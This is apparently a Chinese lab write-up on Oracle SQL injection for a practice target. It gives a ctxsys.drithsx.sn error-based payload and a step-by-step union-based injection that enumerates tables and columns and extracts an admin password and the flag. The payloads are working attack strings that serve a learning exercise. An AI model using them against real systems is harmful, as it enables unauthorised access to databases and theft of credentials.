# Chapter 5.5 报错注入

靶场：.本靶场是Oracle数据库 所以报错注入和之前mysql数据库的（updatexml()）有所不同,

Oracle报错注入的方法：

不用管输出点
不用管数据类型
不用管字段数

直接and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where id=2))

1.  ```select * from all_tables ```查询出所有的表
2.  ```select * from user_tables 查询出当前用户的表```
3.  ```select*from all_tab_columns 查询出所有的字段```
4.  ```*select*from user_tab_columns  查询出当前用户的字段```
5.  ```select*from v$version 查版本```



1. 先还是用显错注入做靶场 老规矩 and 1=1页面正常 and 1=2页面报错 order by猜解字段数为4
   然后union all select null,null,null,null from dual（这里也和mssql一样用null去填充 后面的from dual一定要写 dual是Oracle数据库自带的表）

2. 查询当前用户的表 

   ```mysql
   union all select null,null,null,null from user_table
   #这时不知道哪里是输出点 所以需要探测一下文件的类型
   and 1=2 union all select 1,to_nchar('a'),null,null from user_tables 
   #注意：to_nchar 将varchar2转为nvarchar2
   ```

3. 找到了输出点后

   ```mysql
   and 1=2 union all select 1,to_nchar(table_name),null,null from user_tables
   ```

4. 查询我们需要的表名 ADMIN

   ```mysql
   and 1=2 union all select 1,to_nchar(table_name),null,null from user_tables where table_name!='NEWS'
   ```

   

5. 查询列名 找出列名 ID UNAME UPASS

   ```mysql
   and 1=2 union all select 1,to_nchar(column_name),null,null from user_tab_columns where table_name='ADMIN' and column_name!='ID' and column_name!='UNAME'
   ```

6. 找到UPASS后

   ```mysql
   and 1=2 union all select 1,to_nchar(UPASS),null,null from ADMIN where id=2
   #找出flag
   ```



